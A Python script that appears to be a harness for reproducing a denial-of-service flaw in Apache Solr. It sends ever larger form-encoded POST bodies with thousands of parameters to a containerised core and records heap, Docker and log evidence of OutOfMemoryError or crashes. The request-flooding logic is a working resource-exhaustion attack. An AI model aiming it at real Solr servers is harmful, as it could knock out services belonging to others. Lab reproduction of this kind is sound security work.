#!/usr/bin/env python3
import argparse
import http.client
import json
import os
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone


DEFAULT_SIZES = [
    65536,
    1048576,
    4194304,
    8388608,
    16777216,
    33554432,
    50331648,
    67108864,
    100663296,
]


def now_iso():
    return datetime.now(timezone.utc).isoformat()


def ensure_dirs(case_dir):
    os.makedirs(os.path.join(case_dir, "logs"), exist_ok=True)
    os.makedirs(os.path.join(case_dir, "evidence"), exist_ok=True)


def run_cmd(args, timeout=20):
    try:
        proc = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        return {
            "returncode": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
        }
    except Exception as exc:
        return {"returncode": -1, "stdout": "", "stderr": repr(exc)}


def http_json(url, timeout=10):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            data = resp.read()
            return {
                "ok": True,
                "status": resp.status,
                "bytes": len(data),
                "json": json.loads(data.decode("utf-8", "replace")),
            }
    except Exception as exc:
        return {"ok": False, "error": repr(exc)}


def health(base_url, core, timeout=10):
    url = f"{base_url.rstrip('/')}/{core}/select?q=%2A:%2A&rows=0"
    start = time.time()
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            body = resp.read(1024)
            return {
                "ok": 200 <= resp.status < 500,
                "status": resp.status,
                "latency_seconds": time.time() - start,
                "sample": body.decode("utf-8", "replace"),
            }
    except Exception as exc:
        return {
            "ok": False,
            "error": repr(exc),
            "latency_seconds": time.time() - start,
        }


def docker_stats(container):
    out = run_cmd(
        [
            "docker",
            "stats",
            "--no-stream",
            "--format",
            "{{json .}}",
            container,
        ],
        timeout=15,
    )
    parsed = None
    if out["stdout"].strip():
        try:
            parsed = json.loads(out["stdout"].strip().splitlines()[-1])
        except Exception:
            parsed = None
    return {"raw": out, "parsed": parsed}


def docker_inspect(container):
    out = run_cmd(["docker", "inspect", container], timeout=15)
    parsed = None
    if out["stdout"].strip():
        try:
            parsed = json.loads(out["stdout"])[0]
        except Exception:
            parsed = None
    return {"raw": out, "parsed": parsed}


def docker_logs_tail(container, lines=160):
    return run_cmd(["docker", "logs", "--tail", str(lines), container], timeout=20)


def solr_heap_metrics(base_url):
    metrics_url = (
        f"{base_url.rstrip('/')}/admin/metrics"
        "?group=jvm&prefix=memory.heap&prefix=memory.non-heap&wt=json"
    )
    return http_json(metrics_url, timeout=10)


def build_body(target_size, param_count):
    prefix = b"q=%2A%3A%2A"
    if param_count <= 0:
        param_count = 1
    overhead = len(prefix) + 1
    key_overhead = 0
    for i in range(param_count):
        key_overhead += len(f"&p{i:06d}=".encode("ascii"))
    value_len = max(1, (target_size - overhead - key_overhead) // param_count)
    chunks = [prefix]
    value = b"a" * value_len
    for i in range(param_count):
        chunks.append(f"&p{i:06d}=".encode("ascii"))
        chunks.append(value)
    body = b"".join(chunks)
    if len(body) < target_size:
        body += b"&pad=" + (b"b" * max(0, target_size - len(body) - 5))
    return body, param_count, value_len


def post_form(host, port, path, body, timeout):
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    start = time.time()
    try:
        conn.request(
            "POST",
            path,
            body=body,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(body)),
                "Connection": "close",
            },
        )
        resp = conn.getresponse()
        sample = resp.read(4096)
        return {
            "ok": True,
            "status": resp.status,
            "reason": resp.reason,
            "latency_seconds": time.time() - start,
            "response_sample": sample.decode("utf-8", "replace"),
        }
    except Exception as exc:
        return {
            "ok": False,
            "error": repr(exc),
            "latency_seconds": time.time() - start,
        }
    finally:
        try:
            conn.close()
        except Exception:
            pass


def has_failure_signal(log_text, inspect_info, post_result, health_after):
    lower = log_text.lower()
    oom_markers = [
        "java.lang.outofmemoryerror",
        "outofmemoryerror:",
        "java heap space",
        "fatal error: outofmemoryerror",
    ]
    if any(marker in lower for marker in oom_markers):
        return "OutOfMemoryError"
    if "gc overhead limit exceeded" in lower:
        return "GC overhead"
    state = ((inspect_info or {}).get("State") or {})
    if state.get("Restarting"):
        return "restart"
    if state and not state.get("Running", True):
        oom = state.get("OOMKilled")
        return "container_exit_oom" if oom else "container_exit"
    if post_result.get("status", 0) >= 500 and not health_after.get("ok"):
        return "5xx_sustained"
    if not post_result.get("ok") and not health_after.get("ok"):
        return "timeout_or_unavailable"
    return "none"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--case-dir", required=True)
    parser.add_argument("--container", required=True)
    parser.add_argument("--base-url", default="http://127.0.0.1:18983/solr")
    parser.add_argument("--core", default="doscore")
    parser.add_argument("--sizes", default=",".join(str(s) for s in DEFAULT_SIZES))
    parser.add_argument("--timeout", type=int, default=180)
    parser.add_argument("--request-cap", type=int, default=9)
    args = parser.parse_args()

    ensure_dirs(args.case_dir)
    parsed = urllib.parse.urlparse(args.base_url)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = f"{parsed.path.rstrip('/')}/{args.core}/select"
    sizes = [int(x) for x in args.sizes.split(",") if x.strip()]
    sizes = sizes[: args.request_cap]

    observations = []
    baseline = {
        "time": now_iso(),
        "health": health(args.base_url, args.core),
        "docker_stats": docker_stats(args.container),
        "docker_inspect": docker_inspect(args.container),
        "solr_heap_metrics": solr_heap_metrics(args.base_url),
    }
    failure_signal = "none"
    start_all = time.time()

    for idx, size in enumerate(sizes, 1):
        param_count = max(16, min(8192, size // 2048))
        body, actual_param_count, value_len = build_body(size, param_count)
        before = {
            "time": now_iso(),
            "health": health(args.base_url, args.core),
            "docker_stats": docker_stats(args.container),
            "solr_heap_metrics": solr_heap_metrics(args.base_url),
        }
        post_result = post_form(host, port, path, body, timeout=args.timeout)
        time.sleep(2)
        after_inspect = docker_inspect(args.container)
        after_health = health(args.base_url, args.core)
        after_logs = docker_logs_tail(args.container, lines=240)
        after = {
            "time": now_iso(),
            "health": after_health,
            "docker_stats": docker_stats(args.container),
            "docker_inspect": after_inspect,
            "solr_heap_metrics": solr_heap_metrics(args.base_url),
            "docker_logs_tail": after_logs,
        }
        signal = has_failure_signal(
            (after_logs.get("stdout") or "") + "\n" + (after_logs.get("stderr") or ""),
            after_inspect.get("parsed"),
            post_result,
            after_health,
        )
        observations.append(
            {
                "index": idx,
                "target_body_size_bytes": size,
                "actual_body_size_bytes": len(body),
                "param_count": actual_param_count,
                "value_len": value_len,
                "before": before,
                "post_result": post_result,
                "after": after,
                "failure_signal": signal,
            }
        )
        if signal != "none":
            failure_signal = signal
            break
        time.sleep(1)

    final_logs = docker_logs_tail(args.container, lines=1200)
    output = {
        "case_id": "apache__solr-SOLR-APP-STATIC-0001",
        "base_url": args.base_url,
        "core": args.core,
        "container": args.container,
        "start_time_utc": baseline["time"],
        "end_time_utc": now_iso(),
        "duration_seconds": time.time() - start_all,
        "baseline": baseline,
        "observations": observations,
        "final": {
            "health": health(args.base_url, args.core),
            "docker_stats": docker_stats(args.container),
            "docker_inspect": docker_inspect(args.container),
            "solr_heap_metrics": solr_heap_metrics(args.base_url),
        },
        "failure_signal": failure_signal,
    }

    evidence_path = os.path.join(args.case_dir, "evidence", "probe_observations.json")
    with open(evidence_path, "w", encoding="utf-8") as fh:
        json.dump(output, fh, ensure_ascii=False, indent=2)
    logs_path = os.path.join(args.case_dir, "logs", "container_logs_after_probe.txt")
    with open(logs_path, "w", encoding="utf-8") as fh:
        fh.write(final_logs.get("stdout", ""))
        if final_logs.get("stderr"):
            fh.write("\n--- STDERR ---\n")
            fh.write(final_logs["stderr"])

    print(json.dumps({
        "case_id": output["case_id"],
        "failure_signal": failure_signal,
        "observations": len(observations),
        "evidence": evidence_path,
        "logs": logs_path,
    }, ensure_ascii=False))


if __name__ == "__main__":
    sys.exit(main())
